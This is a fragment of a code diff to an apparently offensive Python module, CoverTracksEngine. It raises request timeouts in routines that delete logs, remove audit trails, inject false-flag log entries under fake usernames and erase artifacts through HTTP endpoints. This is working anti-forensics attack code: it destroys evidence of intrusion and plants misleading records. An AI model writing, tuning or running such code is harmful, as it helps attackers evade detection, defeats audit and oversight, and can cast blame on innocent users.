@@ -84,7 +84,7 @@ class CoverTracksEngine(CoverTracksModule):
                             async with session.post(
                                 url,
                                 json=payload,
-                                timeout=aiohttp.ClientTimeout(total=5)
+                                timeout=aiohttp.ClientTimeout(total=12)
                             ) as resp:
                                 if resp.status in [200, 204]:
                                     logger.info(f"  ✓ Logs deleted via {endpoint}")
@@ -118,7 +118,7 @@ class CoverTracksEngine(CoverTracksModule):
 
                     async with session.delete(
                         url,
-                        timeout=aiohttp.ClientTimeout(total=5)
+                        timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status in [200, 204]:
                             logger.info(f"  ✓ Audit trail removed via {endpoint}")
@@ -170,7 +170,7 @@ class CoverTracksEngine(CoverTracksModule):
                         url,
                         json=false_entry,
                         headers=headers,
-                        timeout=aiohttp.ClientTimeout(total=3)
+                        timeout=aiohttp.ClientTimeout(total=8)
                     ) as resp:
                         if resp.status in [200, 201]:
                             logger.info(f"  ✓ False flag log injected: {false_entry['username']}")
@@ -202,7 +202,7 @@ class CoverTracksEngine(CoverTracksModule):
                     async with session.post(
                         url,
                         json={},
-                        timeout=aiohttp.ClientTimeout(total=3)
+                        timeout=aiohttp.ClientTimeout(total=8)
                     ) as resp:
                         if resp.status in [200, 204]:
                             logger.info(f"  ✓ Artifacts erased via {endpoint}")
